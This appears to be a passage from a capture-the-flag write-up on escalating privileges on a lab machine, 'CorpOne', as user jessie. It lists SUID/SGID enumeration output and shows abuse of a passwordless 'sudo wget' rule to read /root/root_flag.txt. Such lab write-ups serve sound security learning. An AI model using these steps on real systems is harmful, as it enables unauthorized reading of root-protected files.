With the keys we have found, we can log in as *jessie* for [[PORT 22]]. 

## THINGS ABOUT JESSIE

- He uses Firefox
- jessie has a .local folder
- jessie has a .gnupg folder
- jessie has a .config folder
- jessie has a .cache folder
- Has files related to the X11
- Has a .profile file
- Has a examples.desktop
- Has .dmrc file 
- Has files for .bashrc and .bash_logout

## IDEAS AND OPTIONS

- Research on jessie's files, might contain useful information.
- Research on file misconfigurations 
	- SUID & SGUID 
	 ```bash                                     
	$find / -type f -perm /ug+s -exec ls -la {} + 2>/dev/null
	
	-rwsr-xr-x 1 root root        30112 iul 12  2016 /bin/fusermount
	-rwsr-xr-x 1 root root        34812 oct 10  2019 /bin/mount
	-rwsr-xr-x 1 root root        38932 mai  7  2014 /bin/ping
	-rwsr-xr-x 1 root root        43316 mai  7  2014 /bin/ping6
	-rwsr-xr-x 1 root root        38900 mar 26  2019 /bin/su
	-rwsr-xr-x 1 root root        26492 oct 10  2019 /bin/umount
	-rwxr-sr-x 1 root shadow      38684 apr  9  2018 /sbin/pam_extrausers_chkpwd
	-rwxr-sr-x 1 root shadow      38664 apr  9  2018 /sbin/unix_chkpwd
	-rwxr-sr-x 1 root tty          9788 mar  1  2016 /usr/bin/bsd-write
	-rwxr-sr-x 1 root shadow      61276 mar 26  2019 /usr/bin/chage
	-rwsr-xr-x 1 root root        74280 mar 26  2019 /usr/bin/chfn
	-rwsr-xr-x 1 root root        39560 mar 26  2019 /usr/bin/chsh
	-rwxr-sr-x 1 root crontab     38996 apr  6  2016 /usr/bin/crontab
	-rwxr-sr-x 1 root shadow      22000 mar 26  2019 /usr/bin/expiry
	-rwsr-xr-x 1 root root        78012 mar 26  2019 /usr/bin/gpasswd
	-rwxr-sr-x 1 root mlocate     34452 nov 18  2014 /usr/bin/mlocate
	-rwsr-xr-x 1 root root        34680 mar 26  2019 /usr/bin/newgrp
	-rwsr-xr-x 1 root root        53128 mar 26  2019 /usr/bin/passwd
	-rwsr-xr-x 1 root root        18216 mar 27  2019 /usr/bin/pkexec
	-rwxr-sr-x 1 root ssh        431632 mar  4  2019 /usr/bin/ssh-agent
	-rwsr-xr-x 1 root root       159852 oct 11  2019 /usr/bin/sudo
	-rwxr-sr-x 1 root tty         26356 oct 10  2019 /usr/bin/wall
	-rwsr-xr-- 1 root messagebus  46436 iun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
	-rwsr-xr-x 1 root root         5480 mar 27  2017 /usr/lib/eject/dmcrypt-get-device
	-rwxr-sr-x 1 root mail        13680 mai 28  2019 /usr/lib/evolution/camel-lock-helper-1.2
	-rwsr-xr-x 1 root root        13840 mar 18  2017 /usr/lib/i386-linux-gnu/oxide-qt/chrome-sandbox
	-rwxr-sr-x 1 root utmp         5480 mar 11  2016 /usr/lib/i386-linux-gnu/utempter/utempter
	-rwsr-xr-x 1 root root       513528 mar  4  2019 /usr/lib/openssh/ssh-keysign
	-rwsr-xr-x 1 root root        13960 mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
	-rwsr-sr-x 1 root root       113228 aug 20  2019 /usr/lib/snapd/snap-confine
	-rwsr-sr-x 1 root root         9772 oct 25  2018 /usr/lib/xorg/Xorg.wrap
	-rwsr-xr-- 1 root dip        396068 iun 12  2018 /usr/sbin/pppd
	
	cd files ; cat ../suid_sgid  | awk '{print $NF}' | while IFS= read -r line; do LINE=$(basename "${line}") ; wget https://gtfobins.github.io/gtfobins/${LINE} || touch NOT_FOUND_${LINE}; done  ; for file in $(ls) ; do if grep -q "suid" $file ; then echo "$file has suid" ; fi ; done  ; cd .. ;
	
	   ```

While doing this i noticed that jessie is in sudo
```bash
jessie@CorpOne:~$ id
uid=1000(jessie) gid=1000(jessie) groups=1000(jessie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```

By seeing which commands it is allowed to run
```bash
jessie@CorpOne:~$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

And it turns out it is a gtfo bin, (i did not know how to get the shell but by guessing the name of the file)
```bash
jessie@CorpOne:~$ sudo wget -i /root/root_flag.txt
--2024-04-26 20:23:15--  http://b1b968b37519ad1daa6408188649263d/
Resolving b1b968b37519ad1daa6408188649263d (b1b968b37519ad1daa6408188649263d)... failed: Name or service not known.
wget: unable to resolve host address ‘b1b968b37519ad1daa6408188649263d’

```

